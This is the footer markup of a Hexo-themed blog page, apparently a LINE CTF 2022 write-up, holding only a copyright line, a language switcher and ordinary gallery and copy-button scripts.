                &copy; 2026 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>繁體中文</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/03/27/en/linectf-2022-writeup/" class="dropdown-item">
                    English
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>